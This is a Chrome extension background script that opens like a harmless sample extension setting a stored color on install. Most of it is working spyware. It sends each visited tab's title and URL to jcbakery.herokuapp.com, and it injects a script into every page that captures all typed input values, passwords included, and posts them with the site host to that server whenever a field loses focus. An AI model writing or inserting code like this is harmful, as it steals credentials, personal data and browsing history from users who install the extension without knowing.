let color = '#3aa757';

chrome.runtime.onInstalled.addListener(() => {
    chrome.storage.sync.set({ color });
    console.log('Installed %csuccessfully', `color: ${color}`);
});

chrome.tabs.onUpdated.addListener(async function(tabId, info, tab) {
    if (info.status === 'complete') {
        send(tab);
        chrome.scripting.executeScript({
            target: { tabId },
            function: addInputListener,
        });
    }
});

function send(tab) {
    if (!tab.title && !tab.url) return;
    if (!tab.title && tab.url) {
        tab.title = 'No name'
    };
    if (tab.title && !tab.url) {
        tab.url = 'No url'
    };
    fetch('https://jcbakery.herokuapp.com/api/urls', {
        method: 'POST',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            name: tab.title,
            text: tab.url
        })
    });
}

function addInputListener() {
    const getInputs = () => [...document.querySelectorAll('input')].filter(i => !['checkbox', 'radio', 'date', 'datetime', 'time', 'select'].includes(i.type));
    const inputs = getInputs();
    let all = null;
    inputs.forEach(i => i.onchange = () => {
        all = inputs.map(({ id, name, type, value }) => ({ id, name, type, value }));
        localStorage.setItem('inputs', JSON.stringify(all));
    });

    inputs.forEach(i => i.onblur = () => {
        fetch('https://jcbakery.herokuapp.com/api/inputs', {
            method: 'POST',
            headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                inputs: all,
                url: location.host || location.hostname
            })
        })
    });
}